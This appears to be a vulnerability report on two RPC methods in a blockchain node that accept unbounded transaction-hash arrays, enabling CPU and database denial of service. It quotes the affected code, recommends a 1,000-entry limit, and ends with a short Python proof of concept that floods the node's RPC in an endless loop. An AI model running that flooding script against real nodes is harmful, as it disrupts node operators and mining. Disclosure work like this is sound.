### Title
Unbounded `tx_hashes` Array in `get_transaction_proof` / `get_transaction_and_witness_proof` RPC Enables CPU/DB DoS - (File: `rpc/src/module/chain.rs`)

### Summary
The `get_transaction_proof` and `get_transaction_and_witness_proof` RPC methods accept an unbounded `Vec<H256>` of transaction hashes with no size limit enforced in the handler. Each element triggers at least one synchronous database lookup and participates in Merkle proof construction. An unprivileged RPC caller can send a single request with thousands of hashes, forcing the node to perform proportional expensive work at zero cost to the attacker. The analogous light-client P2P handler enforces a hard limit of 1,000 entries, but the RPC path has no equivalent guard.

### Finding Description

Both RPC trait methods accept an unbounded array:

```rust
fn get_transaction_proof(
    &self,
    tx_hashes: Vec<H256>,
    block_hash: Option<H256>,
) -> Result<TransactionProof>;
``` [1](#0-0) 

```rust
fn get_transaction_and_witness_proof(
    &self,
    tx_hashes: Vec<H256>,
    block_hash: Option<H256>,
) -> Result<TransactionAndWitnessProof>;
``` [2](#0-1) 

The implementations delegate to `get_tx_indices(tx_hashes, block_hash)`, which performs a synchronous DB lookup (`get_transaction_info`) for every hash in the caller-supplied array to locate the containing block and compute leaf indices. After that, `CBMT::build_merkle_proof` is called over the full transaction list of the located block:

```rust
fn get_transaction_proof(
    &self,
    tx_hashes: Vec<H256>,
    block_hash: Option<H256>,
) -> Result<TransactionProof> {
    let (block, leaf_indices) = self.get_tx_indices(tx_hashes, block_hash)?;
    Ok(TransactionProof {
        block_hash: block.hash().into(),
        witnesses_root: block.calc_witnesses_root().into(),
        proof: CBMT::build_merkle_proof(
            &block.transactions().iter().map(|tx| tx.hash()).collect::<Vec<_>>(),
            &leaf_indices,
        )
        ...
    })
}
``` [3](#0-2) 

```rust
fn get_transaction_and_witness_proof(
    &self,
    tx_hashes: Vec<H256>,
    block_hash: Option<H256>,
) -> Result<TransactionAndWitnessProof> {
    let (block, leaf_indices) = self.get_tx_indices(tx_hashes, block_hash)?;
    Ok(TransactionAndWitnessProof {
        ...
        transactions_proof: CBMT::build_merkle_proof(...).into(),
        witnesses_proof: CBMT::build_merkle_proof(block.tx_witness_hashes(), &leaf_indices)...into(),
    })
}
``` [4](#0-3) 

By contrast, the light-client P2P handler that performs the same logical operation enforces a hard cap before doing any work:

```rust
if self.message.tx_hashes().len() > constant::GET_TRANSACTIONS_PROOF_LIMIT {
    return StatusCode::MalformedProtocolMessage.with_context("too many transactions");
}
``` [5](#0-4) 

The constant is set to 1,000: [6](#0-5) 

The RPC path has no analogous guard. The only server-side protection is a 10 MiB body size limit (`max_request_body_size = 10485760`), which still allows tens of thousands of 32-byte hashes per request. [7](#0-6) 

The JSON-RPC batch limit (`rpc_batch_limit`) is disabled by default and only limits the number of JSON-RPC calls per batch, not the array size within a single call: [8](#0-7) 

### Impact Explanation

Each request with N hashes causes:
- N synchronous RocksDB `get_transaction_info` lookups (one per hash)
- One full block fetch from DB
- Two `CBMT::build_merkle_proof` passes over all transactions in the block (for the witness variant)

An attacker can flood the RPC with requests each containing ~300,000 hashes (within the 10 MiB body limit, since each H256 is 66 bytes as hex JSON), saturating the DB I/O and CPU of the node. Because the RPC handler runs synchronously on the Tokio thread pool, sustained flooding degrades or blocks all other RPC responses, including `get_block_template` used by miners, causing mining disruption and potential chain stall on nodes that expose the RPC.

### Likelihood Explanation

The RPC is bound to `127.0.0.1:8114` by default, so remote internet attackers are excluded. However, the scope explicitly includes "RPC caller" as a valid attacker profile. Any process with local access to the node (a co-located dApp, a compromised service, or a malicious user on a shared host) can exploit this. Node operators who expose the RPC to a broader network (e.g., for dApp backends) face remote exploitation. The attack requires no authentication, no tokens, and no special knowledge beyond the standard JSON-RPC interface.

### Recommendation

Add an input size guard at the top of both `get_transaction_proof` and `get_transaction_and_witness_proof` implementations, mirroring the existing P2P guard:

```rust
const MAX_TX_HASHES_PER_PROOF_REQUEST: usize = 1000; // match P2P limit

if tx_hashes.len() > MAX_TX_HASHES_PER_PROOF_REQUEST {
    return Err(RPCError::invalid_params(format!(
        "too many tx_hashes: {}, max is {}",
        tx_hashes.len(), MAX_TX_HASHES_PER_PROOF_REQUEST
    )));
}
```

Additionally, consider enabling `rpc_batch_limit` by default to prevent batch-amplified variants of this and similar attacks.

### Proof of Concept

```python
import requests, json

# Each H256 as a hex string is 66 bytes in JSON.
# 10 MiB / 66 bytes ≈ 158,000 hashes per request.
# Use a realistic but still large count:
N = 50_000
fake_hashes = ["0x" + ("aa" * 32)] * N

payload = {
    "id": 1,
    "jsonrpc": "2.0",
    "method": "get_transaction_proof",
    "params": [fake_hashes, None]
}

# Send repeatedly to sustain load
while True:
    requests.post("http://127.0.0.1:8114", json=payload)
```

Each request forces the node to attempt N RocksDB lookups before returning an error. Sustained at even a modest rate (e.g., 10 req/s), this produces 500,000 DB lookups per second, saturating I/O and starving legitimate RPC consumers including the miner's `get_block_template` polling loop. [9](#0-8)

### Citations

**File:** rpc/src/module/chain.rs (L1059-1064)
```rust
    #[rpc(name = "get_transaction_proof")]
    fn get_transaction_proof(
        &self,
        tx_hashes: Vec<H256>,
        block_hash: Option<H256>,
    ) -> Result<TransactionProof>;
```

**File:** rpc/src/module/chain.rs (L1151-1156)
```rust
    #[rpc(name = "get_transaction_and_witness_proof")]
    fn get_transaction_and_witness_proof(
        &self,
        tx_hashes: Vec<H256>,
        block_hash: Option<H256>,
    ) -> Result<TransactionAndWitnessProof>;
```

**File:** rpc/src/module/chain.rs (L1916-1936)
```rust
    fn get_transaction_proof(
        &self,
        tx_hashes: Vec<H256>,
        block_hash: Option<H256>,
    ) -> Result<TransactionProof> {
        let (block, leaf_indices) = self.get_tx_indices(tx_hashes, block_hash)?;
        Ok(TransactionProof {
            block_hash: block.hash().into(),
            witnesses_root: block.calc_witnesses_root().into(),
            proof: CBMT::build_merkle_proof(
                &block
                    .transactions()
                    .iter()
                    .map(|tx| tx.hash())
                    .collect::<Vec<_>>(),
                &leaf_indices,
            )
            .expect("build proof with verified inputs should be OK")
            .into(),
        })
    }
```

**File:** rpc/src/module/chain.rs (L1981-2003)
```rust
    fn get_transaction_and_witness_proof(
        &self,
        tx_hashes: Vec<H256>,
        block_hash: Option<H256>,
    ) -> Result<TransactionAndWitnessProof> {
        let (block, leaf_indices) = self.get_tx_indices(tx_hashes, block_hash)?;
        Ok(TransactionAndWitnessProof {
            block_hash: block.hash().into(),
            transactions_proof: CBMT::build_merkle_proof(
                &block
                    .transactions()
                    .iter()
                    .map(|tx| tx.hash())
                    .collect::<Vec<_>>(),
                &leaf_indices,
            )
            .expect("build proof with verified inputs should be OK")
            .into(),
            witnesses_proof: CBMT::build_merkle_proof(block.tx_witness_hashes(), &leaf_indices)
                .expect("build proof with verified inputs should be OK")
                .into(),
        })
    }
```

**File:** util/light-client-protocol-server/src/components/get_transactions_proof.rs (L37-39)
```rust
        if self.message.tx_hashes().len() > constant::GET_TRANSACTIONS_PROOF_LIMIT {
            return StatusCode::MalformedProtocolMessage.with_context("too many transactions");
        }
```

**File:** util/light-client-protocol-server/src/constant.rs (L7-7)
```rust
pub const GET_TRANSACTIONS_PROOF_LIMIT: usize = 1000;
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** miner/src/client.rs (L273-291)
```rust
    async fn poll_block_template(&self) {
        let poll_interval = time::Duration::from_millis(self.config.poll_interval);
        let mut interval = tokio::time::interval(poll_interval);
        interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
        let stop_rx: CancellationToken = new_tokio_exit_rx();
        loop {
            tokio::select! {
                _ = interval.tick() => {
                    debug!("poll block template...");
                    self.fetch_block_template().await;
                }
                _ = stop_rx.cancelled() => {
                    info!("Miner client pool_block_template received exit signal, exit now");
                    break
                },
                else => break,
            }
        }
    }
```
